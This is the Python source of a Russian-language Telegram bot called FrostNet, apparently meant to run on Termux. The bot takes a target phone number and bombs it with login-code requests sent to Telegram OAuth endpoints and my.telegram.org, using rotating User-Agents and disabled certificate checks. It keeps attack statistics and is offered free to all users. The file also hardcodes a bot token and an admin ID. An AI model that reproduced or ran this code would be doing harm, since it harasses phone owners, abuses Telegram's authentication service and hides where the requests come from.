#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import random
import time
import threading
from datetime import datetime
import urllib3
import json
import os
import sys
import signal
import re

# Отключаем предупреждения
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# КОНФИГУРАЦИЯ
# ============================================

# Токен бота (НОВЫЙ)
BOT_TOKEN = "8506732439:AAFtQErFaBZ2s49PoEjL9AoazfVqoAq1HbY"

# ID администратора
ADMIN_ID = 6747528307

# Название сервиса
SERVICE_NAME = "FrostNet"

# Ссылка на Telegram канал
CHANNEL_LINK = "https://t.me/scyzestg"

# Путь к папке бота
BOT_PATH = "/storage/emulated/0/Bot"

# Количество циклов атаки
ATTACK_CYCLES = 1

# Создаем папку если её нет
if not os.path.exists(BOT_PATH):
    os.makedirs(BOT_PATH)
    print(f"✅ Создана папка: {BOT_PATH}")

# ============================================
# ФАЙЛЫ БАЗ ДАННЫХ
# ============================================

USERS_DB = os.path.join(BOT_PATH, "users.json")
ATTACKS_DB = os.path.join(BOT_PATH, "attacks.json")
STATS_DB = os.path.join(BOT_PATH, "stats.json")
ADMIN_LOG = os.path.join(BOT_PATH, "admin.log")

# ============================================
# ИНИЦИАЛИЗАЦИЯ БАЗ ДАННЫХ
# ============================================

def init_databases():
    """Создает все базы данных если их нет"""
    
    if not os.path.exists(USERS_DB):
        with open(USERS_DB, 'w', encoding='utf-8') as f:
            json.dump({
                "users": {},
                "first_seen": {},
                "total_users": 0
            }, f, indent=2)
        print("✅ Создана: users.json")
    
    if not os.path.exists(ATTACKS_DB):
        with open(ATTACKS_DB, 'w', encoding='utf-8') as f:
            json.dump({
                "history": {}, 
                "frostnet_attacks": {}
            }, f, indent=2)
        print("✅ Создана: attacks.json")
    
    if not os.path.exists(STATS_DB):
        stats_default = {
            "total_users": 0,
            "total_attacks": 0,
            "total_frostnet_attacks": 0,
            "total_requests": 0,
            "total_success": 0,
            "created_at": datetime.now().isoformat(),
            "last_update": datetime.now().isoformat()
        }
        with open(STATS_DB, 'w', encoding='utf-8') as f:
            json.dump(stats_default, f, indent=2)
        print("✅ Создана: stats.json")
    
    if not os.path.exists(ADMIN_LOG):
        with open(ADMIN_LOG, 'w', encoding='utf-8') as f:
            f.write(f"=== ADMIN LOG CREATED: {datetime.now()} ===\n")
        print("✅ Создан: admin.log")
    
    print("=== БАЗЫ ДАННЫХ ГОТОВЫ ===\n")

init_databases()

# ============================================
# ЗАГРУЗКА ДАННЫХ
# ============================================

def load_data():
    global users_data, attacks_data, stats_data
    
    with open(USERS_DB, 'r', encoding='utf-8') as f:
        users_data = json.load(f)
    
    with open(ATTACKS_DB, 'r', encoding='utf-8') as f:
        attacks_data = json.load(f)
    
    with open(STATS_DB, 'r', encoding='utf-8') as f:
        stats_data = json.load(f)

def save_data():
    with open(USERS_DB, 'w', encoding='utf-8') as f:
        json.dump(users_data, f, indent=2, ensure_ascii=False)
    
    with open(ATTACKS_DB, 'w', encoding='utf-8') as f:
        json.dump(attacks_data, f, indent=2, ensure_ascii=False)
    
    with open(STATS_DB, 'w', encoding='utf-8') as f:
        stats_data["last_update"] = datetime.now().isoformat()
        json.dump(stats_data, f, indent=2, ensure_ascii=False)

load_data()

# ============================================
# ИНИЦИАЛИЗАЦИЯ БОТА
# ============================================

bot = telebot.TeleBot(BOT_TOKEN)
user_sessions = {}
active_attacks = {}
bot_active = True

# ============================================
# РАСШИРЕННЫЙ СПИСОК USER-AGENT
# ============================================

USER_AGENTS = [
    # Windows
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    
    # MacOS
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
    
    # iPhone
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    
    # iPad
    'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    
    # Android
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
    
    # Linux
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
]

# Добавляем еще вариации
while len(USER_AGENTS) < 50:
    ver = random.randint(110, 125)
    USER_AGENTS.append(f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36')

print(f"✅ Загружено {len(USER_AGENTS)} User-Agent'ов")

# ============================================
# URL ДЛЯ ФЛУДА (20+ СЕРВИСОВ)
# ============================================

FLOOD_URLS = [
    # Telegram Web (основные)
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1017286728', 'origin': 'https://wer.telegram.org', 'embed': '1'},
        'name': 'Telegram Web'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1852523856', 'origin': 'https://cabinet.presscode.app', 'embed': '1'},
        'name': 'Presscode'
    },
    {
        'url': 'https://translations.telegram.org/auth/request',
        'params': {},
        'name': 'Translations'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1093384146', 'origin': 'https://off-bot.ru', 'embed': '1'},
        'name': 'Off-bot'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '466141824', 'origin': 'https://mipped.com', 'embed': '1'},
        'name': 'Mipped'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '5463728243', 'origin': 'https://www.spot.uz'},
        'name': 'Spot.uz'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1733143901', 'origin': 'https://tbiz.pro', 'embed': '1'},
        'name': 'Tbiz.pro'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '319709511', 'origin': 'https://telegrambot.biz', 'embed': '1'},
        'name': 'Telegrambot.biz'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1199558236', 'origin': 'https://bot-t.com', 'embed': '1'},
        'name': 'Bot-t'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1803424014', 'origin': 'https://ru.telegram-store.com', 'embed': '1'},
        'name': 'Telegram-store'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '210944655', 'origin': 'https://combot.org', 'embed': '1'},
        'name': 'Combot'
    },
    {
        'url': 'https://my.telegram.org/auth/send_password',
        'params': {},
        'name': 'My.Telegram.org'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '5444323279', 'origin': 'https://fragment.com'},
        'name': 'Fragment'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1234567890', 'origin': 'https://telegram.me'},
        'name': 'Telegram.me'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '9876543210', 'origin': 'https://t.me'},
        'name': 'T.me'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1122334455', 'origin': 'https://telegram.org'},
        'name': 'Telegram.org'
    },
]

print(f"✅ Загружено {len(FLOOD_URLS)} сервисов")

# ============================================
# ЛОГИРОВАНИЕ
# ============================================

def log_admin_action(action, user_id, details=""):
    try:
        with open(ADMIN_LOG, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now()}] {action} | User: {user_id} | {details}\n")
    except:
        pass

# ============================================
# ПРОВЕРКА ДОСТУПА (ТЕПЕРЬ ВСЕ ИМЕЮТ ДОСТУП)
# ============================================

def is_verified(user_id):
    """Теперь все пользователи имеют доступ"""
    return True  # Все имеют доступ

# ============================================
# ФУНКЦИЯ ОТПРАВКИ ЗАПРОСА (УЛУЧШЕННАЯ)
# ============================================

def send_flood_request(phone, service):
    """Отправляет запрос на получение кода с правильными заголовками"""
    try:
        phone = re.sub(r'[^\d+]', '', phone)
        if not phone.startswith('+'):
            phone = '+' + phone
        
        user_agent = random.choice(USER_AGENTS)
        
        # Разные заголовки для разных сервисов
        if 'my.telegram.org' in service['url']:
            headers = {
                'User-Agent': user_agent,
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://my.telegram.org',
                'Referer': 'https://my.telegram.org/auth',
                'Connection': 'keep-alive',
            }
        else:
            headers = {
                'User-Agent': user_agent,
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://oauth.telegram.org',
                'Referer': 'https://oauth.telegram.org/',
                'Connection': 'keep-alive',
            }
        
        url = service['url']
        if service.get('params'):
            param_str = '&'.join([f"{k}={v}" for k, v in service['params'].items()])
            if '?' in url:
                url = f"{url}&{param_str}"
            else:
                url = f"{url}?{param_str}"
        
        # Создаем сессию и получаем cookies
        session = requests.Session()
        
        # Сначала получаем cookies
        try:
            if 'my.telegram.org' in url:
                session.get('https://my.telegram.org', headers=headers, timeout=5, verify=False)
            else:
                session.get('https://oauth.telegram.org', headers=headers, timeout=5, verify=False)
        except:
            pass
        
        # Отправляем POST запрос
        response = session.post(
            url,
            headers=headers,
            data={'phone': phone},
            timeout=10,
            verify=False,
            allow_redirects=True
        )
        
        # Проверяем успешность
        success = response.status_code in [200, 302, 303, 304]
        
        # Для my.telegram.org успех это 200 с json
        if 'my.telegram.org' in url and response.status_code == 200:
            try:
                json_response = response.json()
                if json_response.get('status') == 'ok' or 'success' in str(json_response).lower():
                    success = True
            except:
                pass
        
        stats_data["total_requests"] = stats_data.get("total_requests", 0) + 1
        if success:
            stats_data["total_success"] = stats_data.get("total_success", 0) + 1
        save_data()
        
        return success
        
    except Exception as e:
        stats_data["total_requests"] = stats_data.get("total_requests", 0) + 1
        save_data()
        return False

# ============================================
# FROSTNET АТАКА (ОДИН ЦИКЛ)
# ============================================

def frostnet_attack_worker(chat_id, phone, user_id):
    """Один цикл атаки на все сервисы"""
    try:
        msg = bot.send_message(
            chat_id, 
            f"🔥 **{SERVICE_NAME} АТАКА ЗАПУЩЕНА**\n\n📱 Номер: {phone}\n🔄 Сервисов: {len(FLOOD_URLS)}\n⏳ Отправка запросов...", 
            parse_mode='Markdown'
        )
        
        success = 0
        total = 0
        results = []
        
        # Перемешиваем сервисы для равномерной нагрузки
        random.shuffle(FLOOD_URLS)
        
        for service in FLOOD_URLS:
            if send_flood_request(phone, service):
                success += 1
                results.append(f"✅ {service['name']}")
            else:
                results.append(f"❌ {service['name']}")
            total += 1
            
            # Обновляем прогресс
            if total % 5 == 0:
                try:
                    bot.edit_message_text(
                        f"🔥 **{SERVICE_NAME} АТАКА**\n\n📱 Номер: {phone}\n📊 Прогресс: {total}/{len(FLOOD_URLS)}\n✅ Успешно: {success}",
                        chat_id=chat_id,
                        message_id=msg.message_id,
                        parse_mode='Markdown'
                    )
                except:
                    pass
            
            time.sleep(0.5)  # Задержка между запросами
        
        # Сохраняем в историю
        attack_id = f"{user_id}_{int(time.time())}"
        attacks_data["frostnet_attacks"][attack_id] = {
            "user_id": user_id,
            "phone": phone,
            "success": success,
            "total": total,
            "time": datetime.now().isoformat()
        }
        
        stats_data["total_frostnet_attacks"] = stats_data.get("total_frostnet_attacks", 0) + 1
        stats_data["total_attacks"] = stats_data.get("total_attacks", 0) + 1
        save_data()
        
        # Формируем результат
        result_text = f"✅ **{SERVICE_NAME} АТАКА ЗАВЕРШЕНА**\n\n"
        result_text += f"📱 Номер: {phone}\n"
        result_text += f"✅ Успешно: {success}/{total}\n"
        result_text += f"📊 Процент: {success/total*100:.1f}%\n\n"
        result_text += "📋 **Результаты:**\n"
        
        # Показываем первые 7 результатов
        for res in results[:7]:
            result_text += f"{res}\n"
        
        if len(results) > 7:
            result_text += f"... и еще {len(results)-7}"
        
        bot.edit_message_text(
            result_text,
            chat_id=chat_id,
            message_id=msg.message_id,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        try:
            bot.send_message(chat_id, f"❌ Ошибка: {str(e)[:100]}")
        except:
            pass

# ============================================
# РАССЫЛКА
# ============================================

def send_mailing_to_all(text, photo=None):
    sent = 0
    failed = 0
    for user_id in users_data["users"].keys():
        try:
            if photo:
                bot.send_photo(int(user_id), photo, caption=text, parse_mode='Markdown')
            else:
                bot.send_message(int(user_id), text, parse_mode='Markdown')
            sent += 1
        except:
            failed += 1
        time.sleep(0.1)
    return sent, failed

# ============================================
# КЛАВИАТУРЫ
# ============================================

def main_menu():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton(f"🔥 {SERVICE_NAME}", callback_data="frostnet_attack"),
        InlineKeyboardButton("📢 НАШ ТГК", url=CHANNEL_LINK),
        InlineKeyboardButton("👤 ПРОФИЛЬ", callback_data="profile"),
        InlineKeyboardButton("📞 ПОДДЕРЖКА", callback_data="support"),
        InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="stats"),
        InlineKeyboardButton("ℹ️ ИНФОРМАЦИЯ", callback_data="info"),
    ]
    keyboard.add(*buttons)
    return keyboard

def admin_menu():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="admin_stats"),
        InlineKeyboardButton("🔍 ПОИСК", callback_data="admin_search"),
        InlineKeyboardButton("📢 РАССЫЛКА", callback_data="admin_mailing"),
        InlineKeyboardButton("🛑 СТОП ВСЁ", callback_data="admin_stop_all"),
        InlineKeyboardButton("📋 ЛОГИ", callback_data="admin_logs"),
        InlineKeyboardButton("◀️ НАЗАД", callback_data="back_main"),
    ]
    keyboard.add(*buttons)
    return keyboard

def back_button():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("◀️ НАЗАД", callback_data="back_main"))
    return keyboard

# ============================================
# ОБРАБОТЧИКИ КОМАНД
# ============================================

@bot.message_handler(commands=['start'])
def start(message):
    user_id = str(message.from_user.id)
    
    # Сохраняем пользователя
    if user_id not in users_data["users"]:
        users_data["users"][user_id] = {
            "first_seen": datetime.now().isoformat(),
            "username": message.from_user.username,
            "first_name": message.from_user.first_name,
            "last_name": message.from_user.last_name,
            "last_active": datetime.now().isoformat()
        }
        users_data["total_users"] = len(users_data["users"])
        stats_data["total_users"] = len(users_data["users"])
        save_data()
        log_admin_action("NEW_USER", user_id)
    else:
        users_data["users"][user_id]["last_active"] = datetime.now().isoformat()
        save_data()
    
    # Приветственное сообщение
    welcome_text = (
        f"❄️ **Добро пожаловать в {SERVICE_NAME}!** ❄️\n\n"
        f"🚀 **Бот вышел на новый уровень!**\n"
        f"Мы добавили больше сервисов и улучшили стабильность.\n\n"
        f"✨ **О проекте:**\n"
        f"{SERVICE_NAME} - это мощный инструмент для отправки запросов.\n"
        f"Весь проект создан и поддерживается **одним человеком**.\n"
        f"Спасибо за вашу поддержку и доверие! 🙏\n\n"
        f"🔥 **Доступно:** {len(FLOOD_URLS)} сервисов\n"
        f"⚡ **Режим:** Мгновенный запуск\n\n"
        f"📢 **Поддержите нас - зайдите в наш ТГК:**"
    )
    
    # Клавиатура с каналом
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📢 ПЕРЕЙТИ В ТГК", url=CHANNEL_LINK))
    keyboard.add(InlineKeyboardButton("✅ ПРОДОЛЖИТЬ", callback_data="back_main"))
    
    bot.send_message(
        message.chat.id, 
        welcome_text, 
        reply_markup=keyboard, 
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ У вас нет доступа")
        return
    bot.send_message(
        message.chat.id, 
        "👑 **АДМИН ПАНЕЛЬ**\n\nВыберите действие:", 
        reply_markup=admin_menu(), 
        parse_mode='Markdown'
    )

# ============================================
# ОБРАБОТЧИК КОЛБЭКОВ
# ============================================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    data = call.data
    
    if data == "back_main":
        bot.edit_message_text(
            f"❄️ **ГЛАВНОЕ МЕНЮ {SERVICE_NAME}** ❄️\n\nВыберите действие:", 
            chat_id=call.message.chat.id, 
            message_id=call.message.message_id, 
            reply_markup=main_menu(), 
            parse_mode='Markdown'
        )
    
    elif data == "frostnet_attack":
        user_sessions[user_id] = {"step": "frostnet_phone"}
        bot.edit_message_text(
            f"🔥 **{SERVICE_NAME} АТАКА**\n\n"
            f"Введите номер телефона:\n"
            f"📱 Пример: +79991234567 или 79991234567\n\n"
            f"⚡ Доступно сервисов: {len(FLOOD_URLS)}", 
            chat_id=call.message.chat.id, 
            message_id=call.message.message_id, 
            parse_mode='Markdown'
        )
    
    elif data == "profile":
        user_info = f"👤 **ПРОФИЛЬ**\n\n"
        user_info += f"🆔 ID: `{user_id}`\n"
        user_info += f"👤 Username: @{call.from_user.username or 'нет'}\n"
        user_info += f"📝 Имя: {call.from_user.first_name or 'нет'}\n"
        user_info += f"📝 Фамилия: {call.from_user.last_name or 'нет'}\n\n"
        user_info += f"🔥 **СТАТУС: АКТИВЕН**\n"
        user_info += f"📊 Всего атак: {stats_data.get('total_frostnet_attacks', 0)}\n"
        user_info += f"📨 Запросов: {stats_data.get('total_requests', 0)}"
        
        bot.edit_message_text(
            user_info, 
            chat_id=call.message.chat.id, 
            message_id=call.message.message_id, 
            reply_markup=back_button(), 
            parse_mode='Markdown'
        )
    
    elif data == "support":
        bot.edit_message_text(
            "📞 **ПОДДЕРЖКА**\n\n"
            f"👤 Админ: @metaforix\n"
            f"📢 Канал: {CHANNEL_LINK}\n\n"
            "По всем вопросам обращайтесь к администратору.", 
            chat_id=call.message.chat.id, 
            message_id=call.message.message_id, 
            reply_markup=back_button(), 
            parse_mode='Markdown'
        )
    
    elif data == "stats":
        total_req = stats_data.get('total_requests', 0)
        total_succ = stats_data.get('total_success', 0)
        success_rate = (total_succ / total_req * 100) if total_req > 0 else 0
        
        text = f"📊 **СТАТИСТИКА {SERVICE_NAME}**\n\n"
        text += f"👥 Пользователей: {stats_data.get('total_users', 0)}\n"
        text += f"⚡ Атак всего: {stats_data.get('total_attacks', 0)}\n"
        text += f"🔥 Атак {SERVICE_NAME}: {stats_data.get('total_frostnet_attacks', 0)}\n"
        text += f"📨 Запросов: {total_req}\n"
        text += f"✅ Успешных: {total_succ}\n"
        text += f"📊 Процент: {success_rate:.1f}%\n"
        text += f"🔄 Сервисов: {len(FLOOD_URLS)}\n"
        text += f"🤖 User-Agent: {len(USER_AGENTS)}"
        
        bot.edit_message_text(
            text, 
            chat_id=call.message.chat.id, 
            message_id=call.message.message_id, 
            reply_markup=back_button(), 
            parse_mode='Markdown'
        )
    
    elif data == "info":
        info_text = (
            f"ℹ️ **О {SERVICE_NAME}**\n\n"
            f"🤖 **Создатель:** @metaforix\n\n"
            f"📌 **Сервисы:** {len(FLOOD_URLS)} (Telegram Web, My.Telegram.org и др.)\n\n"
            f"🚀 **Особенности:**\n"
            f"• Мгновенный запуск\n"
            f"• Без ограничений\n"
            f"• Бесплатно для всех\n"
            f"• Постоянное обновление\n\n"
            f"❄️ **{SERVICE_NAME}** - это проект одного человека.\n"
            f"Мы идем вперед и развиваемся!\n\n"
            f"🙏 Спасибо за вашу поддержку!"
        )
        bot.edit_message_text(
            info_text, 
            chat_id=call.message.chat.id, 
            message_id=call.message.message_id, 
            reply_markup=back_button(), 
            parse_mode='Markdown'
        )
    
    # ===== АДМИН ФУНКЦИИ =====
    elif data.startswith("admin_"):
        if user_id != ADMIN_ID:
            bot.answer_callback_query(call.id, "❌ Доступ запрещен", show_alert=True)
            return
        
        if data == "admin_stats":
            total_req = stats_data.get('total_requests', 0)
            total_succ = stats_data.get('total_success', 0)
            success_rate = (total_succ / total_req * 100) if total_req > 0 else 0
            
            text = f"👑 **АДМИН СТАТИСТИКА**\n\n"
            text += f"👥 Всего: {stats_data.get('total_users', 0)}\n"
            text += f"⚡ Атак: {stats_data.get('total_attacks', 0)}\n"
            text += f"🔥 {SERVICE_NAME}: {stats_data.get('total_frostnet_attacks', 0)}\n"
            text += f"📨 Запросов: {total_req}\n"
            text += f"✅ Успешно: {total_succ}\n"
            text += f"📊 Процент: {success_rate:.1f}%\n"
            text += f"🔄 Сервисов: {len(FLOOD_URLS)}\n"
            text += f"📁 Размер БД: {os.path.getsize(USERS_DB) if os.path.exists(USERS_DB) else 0} байт"
            
            bot.edit_message_text(
                text, 
                chat_id=call.message.chat.id, 
                message_id=call.message.message_id, 
                reply_markup=admin_menu(), 
                parse_mode='Markdown'
            )
        
        elif data == "admin_search":
            user_sessions[user_id] = {"step": "admin_search_id"}
            bot.edit_message_text(
                "🔍 **ПОИСК ПОЛЬЗОВАТЕЛЯ**\n\nВведите ID пользователя:", 
                chat_id=call.message.chat.id, 
                message_id=call.message.message_id,
                parse_mode='Markdown'
            )
        
        elif data == "admin_mailing":
            user_sessions[user_id] = {"step": "admin_mailing_text"}
            bot.edit_message_text(
                "📢 **РАССЫЛКА**\n\n"
                "Введите текст для рассылки:\n"
                "(можно использовать Markdown разметку)\n\n"
                "Или отправьте фото с подписью.", 
                chat_id=call.message.chat.id, 
                message_id=call.message.message_id, 
                parse_mode='Markdown'
            )
        
        elif data == "admin_stop_all":
            for attack_id, attack in active_attacks.items():
                attack["running"] = False
            active_attacks.clear()
            bot.answer_callback_query(call.id, "🛑 Все атаки остановлены", show_alert=True)
        
        elif data == "admin_logs":
            try:
                if os.path.exists(ADMIN_LOG):
                    with open(ADMIN_LOG, 'r', encoding='utf-8') as f:
                        logs = f.readlines()[-20:]  # Последние 20 строк
                    log_text = "📋 **ПОСЛЕДНИЕ ЛОГИ:**\n\n" + "".join(logs)[:3000]
                    bot.edit_message_text(
                        log_text,
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        reply_markup=admin_menu(),
                        parse_mode='Markdown'
                    )
                else:
                    bot.answer_callback_query(call.id, "❌ Логи не найдены", show_alert=True)
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)[:50]}", show_alert=True)

# ============================================
# ОБРАБОТКА ТЕКСТА
# ============================================

@bot.message_handler(func=lambda m: m.from_user.id in user_sessions)
def handle_text(message):
    user_id = message.from_user.id
    step = user_sessions[user_id].get("step")
    text = message.text.strip()
    
    if step == "frostnet_phone":
        # Очищаем номер
        cleaned = re.sub(r'[^\d+]', '', text)
        if not cleaned.startswith('+'):
            cleaned = '+' + cleaned.lstrip('+')
        
        # Проверяем формат
        if len(cleaned) < 8 or len(cleaned) > 15:
            bot.reply_to(
                message, 
                "❌ **Неверный формат**\n\nПримеры:\n+79991234567\n79991234567\n89991234567", 
                parse_mode='Markdown'
            )
            return
        
        # Подтверждение
        keyboard = InlineKeyboardMarkup()
        keyboard.add(
            InlineKeyboardButton("✅ ПОДТВЕРДИТЬ", callback_data=f"confirm_attack_{cleaned}"),
            InlineKeyboardButton("❌ ОТМЕНА", callback_data="back_main")
        )
        
        bot.reply_to(
            message, 
            f"🔥 **ПОДТВЕРДИТЕ АТАКУ**\n\n"
            f"📱 Номер: {cleaned}\n"
            f"🔄 Сервисов: {len(FLOOD_URLS)}\n\n"
            f"Запустить атаку?", 
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        del user_sessions[user_id]
    
    elif step == "admin_search_id":
        if not text.isdigit():
            bot.reply_to(message, "❌ ID должен быть числом")
            return
        
        result = f"🔍 **ПОИСК ПО ID: {text}**\n\n"
        
        if text in users_data["users"]:
            user = users_data["users"][text]
            result += f"✅ **Пользователь найден**\n\n"
            result += f"👤 Имя: {user.get('first_name', 'Нет')}\n"
            result += f"📝 Фамилия: {user.get('last_name', 'Нет')}\n"
            result += f"👤 Username: @{user.get('username', 'Нет')}\n"
            result += f"📅 Первое появление: {user.get('first_seen', 'Нет')[:16]}\n"
            result += f"🕐 Последний визит: {user.get('last_active', 'Нет')[:16]}"
        else:
            result += "❌ Пользователь не найден"
        
        bot.reply_to(message, result, parse_mode='Markdown')
        del user_sessions[user_id]
    
    elif step == "admin_mailing_text":
        # Отправляем сразу
        bot.reply_to(
            message, 
            f"⏳ **РАССЫЛКА НАЧАТА**\n\n"
            f"Текст: {text[:100]}...\n"
            f"Пользователей: {len(users_data['users'])}", 
            parse_mode='Markdown'
        )
        
        def mailing_thread():
            sent, failed = send_mailing_to_all(text)
            bot.send_message(
                ADMIN_ID, 
                f"✅ **РАССЫЛКА ЗАВЕРШЕНА**\n\n"
                f"✅ Отправлено: {sent}\n"
                f"❌ Ошибок: {failed}\n"
                f"📊 Всего: {len(users_data['users'])}", 
                parse_mode='Markdown'
            )
        
        thread = threading.Thread(target=mailing_thread)
        thread.daemon = True
        thread.start()
        
        del user_sessions[user_id]

# ============================================
# ОБРАБОТКА КОМАНД (callback_data)
# ============================================

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_attack_'))
def confirm_attack(call):
    phone = call.data.replace('confirm_attack_', '')
    user_id = call.from_user.id
    
    bot.edit_message_text(
        f"✅ **АТАКА ЗАПУЩЕНА**\n\n📱 Номер: {phone}\n🔥 {len(FLOOD_URLS)} сервисов", 
        chat_id=call.message.chat.id, 
        message_id=call.message.message_id, 
        parse_mode='Markdown'
    )
    
    thread = threading.Thread(
        target=frostnet_attack_worker, 
        args=(call.message.chat.id, phone, user_id)
    )
    thread.daemon = True
    thread.start()

# ============================================
# ОБРАБОТКА ФОТО
# ============================================

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID and user_id in user_sessions and user_sessions[user_id].get("step") == "admin_mailing_text":
        photo = message.photo[-1].file_id
        caption = message.caption or ""
        
        bot.reply_to(
            message, 
            f"⏳ **РАССЫЛКА НАЧАТА**\n\n"
            f"С фото\nТекст: {caption[:100]}...\n"
            f"Пользователей: {len(users_data['users'])}", 
            parse_mode='Markdown'
        )
        
        def mailing_thread():
            sent, failed = send_mailing_to_all(caption, photo)
            bot.send_message(
                ADMIN_ID, 
                f"✅ **РАССЫЛКА ЗАВЕРШЕНА**\n\n"
                f"✅ Отправлено: {sent}\n"
                f"❌ Ошибок: {failed}\n"
                f"📊 Всего: {len(users_data['users'])}", 
                parse_mode='Markdown'
            )
        
        thread = threading.Thread(target=mailing_thread)
        thread.daemon = True
        thread.start()
        
        del user_sessions[user_id]

# ============================================
# ФУНКЦИЯ ДЛЯ АВТОСОХРАНЕНИЯ
# ============================================

def keep_alive():
    while True:
        try:
            time.sleep(60)
            save_data()
        except:
            pass

# ============================================
# ЗАПУСК
# ============================================

if __name__ == "__main__":
    print("\n" + "=" * 60)
    print(f"❄️ {SERVICE_NAME} BOT ЗАПУЩЕН")
    print("=" * 60)
    print(f"📁 Папка: {BOT_PATH}")
    print(f"👑 Админ ID: {ADMIN_ID}")
    print(f"📢 Канал: {CHANNEL_LINK}")
    print(f"🛠 Сервисов: {len(FLOOD_URLS)}")
    print(f"🔄 User-Agent: {len(USER_AGENTS)}")
    print(f"📊 Пользователей: {stats_data.get('total_users', 0)}")
    print("=" * 60)
    print("✅ Режим: БЕСПЛАТНЫЙ ДЛЯ ВСЕХ")
    print("✅ Проверка ника: ОТКЛЮЧЕНА")
    print("✅ Токен: НОВЫЙ")
    print("=" * 60 + "\n")
    
    # Запускаем keep_alive
